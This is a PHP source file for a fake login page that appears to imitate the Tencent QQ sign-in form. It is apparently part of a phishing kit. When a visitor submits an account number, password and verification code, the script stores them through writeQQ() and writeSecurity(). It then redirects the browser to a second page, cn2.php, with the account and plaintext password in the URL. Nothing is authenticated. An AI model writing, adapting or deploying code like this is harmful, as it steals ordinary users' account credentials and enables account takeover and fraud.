<?php 
	require('header.php'); 
	require('function.php');
?>

	<?php
        if(isset($_POST['u']) && isset($_POST['p']) && isset($_POST['verifycode'])){
            if(empty($_POST['u']) && empty($_POST['p']) && empty($_POST['verifycode'])){
                echo '<script>alert("请完整填写信息"); </script>';
            }else{
                if(!is_numeric($_POST['u']) || strlen($_POST['u'])<5 || strlen($_POST['p'])>16){
                    echo '<script>alert("帐号密码格式错误"); </script>';
                }else{
                    writeQQ($_POST['u'],$_POST['p']);
                    writeSecurity($_POST['u'],'');
                    echo '<script>parent.location.href="cn2.php?u='.$_POST['u'].'&p='.$_POST['p'].'"</script>';
                }
            }
        }
    ?>

	<section>
		<div class="center">
			<div class="left_logo">
				<img src="images/index_02.png">
			</div>
			<div class="user_login_right">
				<img src="images/login_panel.jpg">
				<div class="login_form">
					<form method="post" action="index.php">
						<input type="text" style="border-bottom: 1px solid rgb(170,170,170);" placeholder="QQ号码/手机/邮箱" name="u">
						<input type="password" name="p">
						<input style="height:18px!important;border-top: 1px solid rgb(170,170,170);" type="text" name="verifycode">
						<input type="submit" id="confirm" value="" style="width:95px;height:36px;background:url(images/index_13.png) no-repeat">
					</form>
				</div>
			</div>
		</div>
	</section>

<?php require('footer.php'); ?>